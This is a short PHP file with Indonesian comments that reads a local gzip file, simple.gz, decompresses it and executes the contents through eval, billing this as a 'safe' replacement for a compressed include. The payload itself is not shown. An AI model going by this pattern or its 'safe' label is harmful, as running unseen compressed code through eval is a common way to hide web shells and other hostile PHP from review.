<?php
/**
 * Aman & kompatibel pengganti:
 *     include 'compress.zlib://simple.gz';
 *
 * Fungsi sama: membaca file gzip (.gz) lalu mengeksekusi isinya sebagai PHP.
 */

$gzFile = __DIR__ . '/simple.gz';

// Pastikan zlib aktif
if (!extension_loaded('zlib')) {
    die('Error: Ekstensi zlib tidak aktif di server.');
}

// Pastikan file ada dan bisa dibaca
if (!is_readable($gzFile)) {
    die('Error: File tidak ditemukan atau tidak dapat dibaca: ' . htmlspecialchars($gzFile));
}

// Dekompresi isi file
$contents = @gzdecode(file_get_contents($gzFile));
if ($contents === false) {
    // Fallback kalau gzdecode tidak tersedia
    $handle = @gzopen($gzFile, 'rb');
    if ($handle === false) {
        die('Error: Gagal membuka file gzip.');
    }
    $contents = '';
    while (!gzeof($handle)) {
        $contents .= gzread($handle, 4096);
    }
    gzclose($handle);
}

// Jalankan isi file (seperti include)
eval('?>' . $contents);
